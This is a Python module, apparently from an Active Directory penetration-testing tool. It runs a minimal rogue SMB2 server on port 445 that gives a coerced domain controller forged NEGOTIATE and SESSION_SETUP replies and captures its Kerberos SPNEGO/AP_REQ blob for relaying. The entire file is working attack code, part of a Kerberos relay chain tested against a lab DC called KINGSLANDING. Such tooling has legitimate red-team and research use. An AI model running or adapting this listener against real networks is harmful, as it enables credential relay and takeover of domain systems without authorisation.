"""Minimal raw asyncio SMB2 server for Kerberos AP_REQ capture.

Captures the SPNEGO blob from an incoming SMB2 SESSION_SETUP request without
running a full SMB stack. The DC sends:
  1. [4-byte NetBIOS length] + SMB2 NEGOTIATE REQUEST
  2. [4-byte NetBIOS length] + SMB2 SESSION_SETUP REQUEST (SPNEGO blob)

We respond with valid SMB2 headers to keep the DC happy, extract the security
blob from SESSION_SETUP, and put it in the asyncio Queue.

Why raw asyncio instead of aiosmb SMBServer:
  aiosmb's SMBServer uses UniServer (asysocks) which adds an extra layer of
  connection dispatching. Under load (coercion running concurrently), incoming
  connections occasionally get lost in the dispatch queue. A raw asyncio.start_server
  handler is simpler, more reliable, and already confirmed to receive connections
  from KINGSLANDING in practice.
"""

from __future__ import annotations

import asyncio
import contextlib
import struct
from dataclasses import dataclass

from adscan_internal import telemetry
from adscan_internal.rich_output import print_info, print_info_debug
from adscan_core.rich_output import print_exception

# ---------------------------------------------------------------------------
# SMB2 constants (minimal set for NEGOTIATE + SESSION_SETUP)
# ---------------------------------------------------------------------------

_SMB2_MAGIC = b"\xfeSMB"
_SMB2_NEGOTIATE = 0x0000
_SMB2_SESSION_SETUP = 0x0001
_FLAGS_REPLY = 0x00000001
_STATUS_MORE_PROCESSING = 0xC0000016
_STATUS_SUCCESS = 0x00000000
_STATUS_ACCESS_DENIED = 0xC0000022

# Minimal SPNEGO NegTokenInit advertising MS-KRB5 + KRB5 (Kerberos-first)
# Built statically to avoid asyauth import at module level
_SPNEGO_NEGO_BYTES: bytes = b""


def _get_spnego_token() -> bytes:
    """Return a SPNEGO NegTokenInit advertising Kerberos mechs."""
    global _SPNEGO_NEGO_BYTES
    if _SPNEGO_NEGO_BYTES:
        return _SPNEGO_NEGO_BYTES
    try:
        from badauth.protocols.spnego.messages.asn1_structs import (  # type: ignore[import]
            GSSAPI, GSSType, MechType, NegotiationToken, NegTokenInit2, NegHints,
        )
        tokinit = {
            "mechTypes": [
                MechType("1.2.840.48018.1.2.2"),   # MS-KRB5
                MechType("1.2.840.113554.1.2.2"),   # KRB5
            ],
            "negHints": NegHints({"hintName": "not_defined_in_RFC4178@please_ignore"}),
        }
        token = NegotiationToken({"negTokenInit": NegTokenInit2(tokinit)})
        _SPNEGO_NEGO_BYTES = GSSAPI(
            {"type": GSSType("1.3.6.1.5.5.2"), "value": token}
        ).dump()
    except Exception:
        _SPNEGO_NEGO_BYTES = bytes.fromhex(
            "604806062b0601050502a03e303ca00e300c060a2b060104018237"
            "0202020060a2b06010401823702020a0328301a1018686f73742f6e"
            "6f74776865726"
            "5406578616d706c652e636f6d"
        )
    return _SPNEGO_NEGO_BYTES


def _build_accept_completed_token() -> bytes:
    """Return a minimal SPNEGO NegTokenResp accept-completed."""
    try:
        from badauth.protocols.spnego.messages.asn1_structs import (  # type: ignore[import]
            NegotiationToken, NegTokenResp, NegState,
        )
        token = NegotiationToken({
            "negTokenResp": NegTokenResp({"negState": NegState("accept-completed")})
        })
        return token.dump()
    except Exception:
        return b""


# ---------------------------------------------------------------------------
# Raw SMB2 packet helpers
# ---------------------------------------------------------------------------

def _netbios_frame(payload: bytes) -> bytes:
    """Wrap payload in a 4-byte NetBIOS session header."""
    return struct.pack(">I", len(payload)) + payload


def _smb2_header(
    command: int,
    status: int,
    message_id: int,
    session_id: int = 0,
    flags: int = _FLAGS_REPLY,
) -> bytes:
    """Build a minimal SMB2 header (64 bytes)."""
    return (
        _SMB2_MAGIC                     # ProtocolId
        + struct.pack("<H", 64)         # StructureSize
        + struct.pack("<H", 1)          # CreditCharge
        + struct.pack("<I", status)     # Status
        + struct.pack("<H", command)    # Command
        + struct.pack("<H", 1)          # CreditResponse
        + struct.pack("<I", flags)      # Flags
        + struct.pack("<I", 0)          # NextCommand
        + struct.pack("<Q", message_id) # MessageId
        + struct.pack("<I", 0)          # Reserved
        + struct.pack("<I", 0)          # TreeId
        + struct.pack("<Q", session_id) # SessionId
        + bytes(16)                     # Signature
    )


def _negotiate_reply(security_blob: bytes) -> bytes:
    """Build SMB2 NEGOTIATE RESPONSE using dialect 0x0202 (SMB 2.0.2).

    Using 0x0202 avoids the mandatory NegotiateContext structures required by 3.x dialects.
    Windows clients accept 0x0202 and proceed directly to SESSION_SETUP.
    """
    import datetime
    import uuid

    now_ft = int((datetime.datetime.utcnow() - datetime.datetime(1601, 1, 1))
                 .total_seconds() * 10_000_000)

    sec_buf_offset = 64 + 64  # header(64) + fixed negotiate body(64) = 0x80 (matches impacket/krbrelayx)
    body = (
        struct.pack("<H", 65)               # StructureSize
        + struct.pack("<H", 0)              # SecurityMode (no signing required)
        + struct.pack("<H", 0x0202)         # DialectRevision SMB 2.0.2 — no NegotiateContext needed
        + struct.pack("<H", 0)              # NegotiateContextCount (0 for 2.0.2)
        + uuid.uuid4().bytes                # ServerGuid (16 bytes)
        + struct.pack("<I", 0x7F)           # Capabilities
        + struct.pack("<I", 0x100000)       # MaxTransactSize
        + struct.pack("<I", 0x100000)       # MaxReadSize
        + struct.pack("<I", 0x100000)       # MaxWriteSize
        + struct.pack("<Q", now_ft)         # SystemTime
        + struct.pack("<Q", now_ft)         # ServerStartTime
        + struct.pack("<H", sec_buf_offset) # SecurityBufferOffset
        + struct.pack("<H", len(security_blob))  # SecurityBufferLength
        + struct.pack("<I", 0)              # NegotiateContextOffset (unused in 2.0.2)
        + security_blob
    )
    header = _smb2_header(_SMB2_NEGOTIATE, _STATUS_SUCCESS, 0)
    return _netbios_frame(header + body)


def _session_setup_reply(security_blob: bytes, session_id: int, status: int) -> bytes:
    """Build SMB2 SESSION_SETUP RESPONSE."""
    sec_buf_offset = 64 + 9  # header + fixed session setup reply fields
    body = (
        struct.pack("<H", 9)            # StructureSize
        + struct.pack("<H", 0)          # SessionFlags
        + struct.pack("<H", sec_buf_offset)  # SecurityBufferOffset
        + struct.pack("<H", len(security_blob))  # SecurityBufferLength
        + security_blob
    )
    header = _smb2_header(_SMB2_SESSION_SETUP, status, 1, session_id=session_id)
    return _netbios_frame(header + body)


# ---------------------------------------------------------------------------
# Connection handler
# ---------------------------------------------------------------------------

async def _handle_smb_connection(
    reader: asyncio.StreamReader,
    writer: asyncio.StreamWriter,
    capture_queue: asyncio.Queue[bytes],
) -> None:
    """Handle one incoming SMB2 connection: negotiate → capture SESSION_SETUP blob."""
    peer = writer.get_extra_info("peername", ("?", 0))
    peer_ip = peer[0] if peer else "?"
    try:
        # Read NEGOTIATE request
        nb_hdr = await asyncio.wait_for(reader.readexactly(4), timeout=15.0)
        length = struct.unpack(">I", nb_hdr)[0]
        if length == 0 or length > 0x80000:
            return
        data = await asyncio.wait_for(reader.readexactly(length), timeout=15.0)

        if len(data) < 4:
            return

        # Windows clients send SMB1 NEGOTIATE first (magic \xffSMB) before SMB2.
        # Respond with our SMB2 NEGOTIATE reply — Windows accepts this and proceeds
        # directly to SMB2 SESSION_SETUP (no second NEGOTIATE round needed).
        # SMB2 NEGOTIATE starts with \xfeSMB — treat both the same way.
        if data[:4] not in (b"\xffSMB", b"\xfeSMB"):
            return

        # Respond with NEGOTIATE reply
        nego_resp = _negotiate_reply(_get_spnego_token())
        writer.write(nego_resp)
        await writer.drain()

        # With dialect 0x0202 the client proceeds directly to SESSION_SETUP.
        # Read SESSION_SETUP request
        nb_hdr2 = await asyncio.wait_for(reader.readexactly(4), timeout=15.0)
        length2 = struct.unpack(">I", nb_hdr2)[0]
        if length2 == 0 or length2 > 0x80000:
            return
        data2 = await asyncio.wait_for(reader.readexactly(length2), timeout=15.0)

        # Parse SESSION_SETUP: header(64) + StructureSize(2) + Flags(1) + SecurityMode(1)
        # + Capabilities(4) + Channel(4) + SecurityBufferOffset(2) + SecurityBufferLength(2)
        # + PreviousSessionId(8) = 24 bytes fixed → security buffer starts at offset 88
        if len(data2) < 68 + 24:
            return

        # Verify this is SESSION_SETUP
        command = struct.unpack_from("<H", data2, 12)[0]
        if command != _SMB2_SESSION_SETUP:
            return

        session_id = struct.unpack_from("<Q", data2, 40)[0]
        sec_buf_offset = struct.unpack_from("<H", data2, 64 + 12)[0]
        sec_buf_len = struct.unpack_from("<H", data2, 64 + 14)[0]

        if sec_buf_offset + sec_buf_len > len(data2) or sec_buf_len == 0:
            return

        spnego_blob = data2[sec_buf_offset:sec_buf_offset + sec_buf_len]
        is_ntlm = spnego_blob[:7] == b"NTLMSSP"
        proto = "NTLM" if is_ntlm else "Kerberos"
        print_info_debug(
            f"[smb-krb-capture] {proto} blob from {peer_ip} ({sec_buf_len} bytes)"
        )

        # Send accept-completed so the DC doesn't cache an ACCESS_DENIED failure
        accept_token = _build_accept_completed_token()
        ss_resp = _session_setup_reply(accept_token, session_id or 1, _STATUS_SUCCESS)
        writer.write(ss_resp)
        await writer.drain()

        await capture_queue.put(spnego_blob)

    except (asyncio.TimeoutError, asyncio.IncompleteReadError, ConnectionError, OSError):
        pass
    except Exception as exc:
        try:
            telemetry.capture_exception(exc)
            print_exception(exception=exc)
        except Exception:
            pass
        print_info_debug(f"[smb-krb-capture] error from {peer_ip}: {exc}")
    finally:
        with contextlib.suppress(Exception):
            writer.close()
            await writer.wait_closed()


# ---------------------------------------------------------------------------
# Listener
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class SMBKrbCaptureConfig:
    listen_host: str = "0.0.0.0"
    listen_port: int = 445
    timeout_seconds: float = 120.0


class SMBKrbCaptureListener:
    """Raw asyncio SMB2 listener that captures the Kerberos SPNEGO blob from SESSION_SETUP.

    Usage::

        queue: asyncio.Queue[bytes] = asyncio.Queue()
        listener = SMBKrbCaptureListener(config, queue)
        await listener.start()
        try:
            spnego_blob = await asyncio.wait_for(queue.get(), timeout=120.0)
        finally:
            await listener.stop()
    """

    def __init__(
        self,
        config: SMBKrbCaptureConfig,
        capture_queue: asyncio.Queue[bytes],
    ) -> None:
        self._config = config
        self._queue = capture_queue
        self._server: asyncio.Server | None = None

    async def start(self) -> None:
        self._server = await asyncio.start_server(
            self._handle,
            self._config.listen_host,
            self._config.listen_port,
        )
        print_info(
            f"Kerberos relay SMB listener ready — "
            f"{self._config.listen_host}:{self._config.listen_port}"
        )

    async def stop(self) -> None:
        if self._server is None:
            return
        self._server.close()
        with contextlib.suppress(Exception):
            await self._server.wait_closed()
        self._server = None

    async def _handle(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ) -> None:
        await _handle_smb_connection(reader, writer, self._queue)
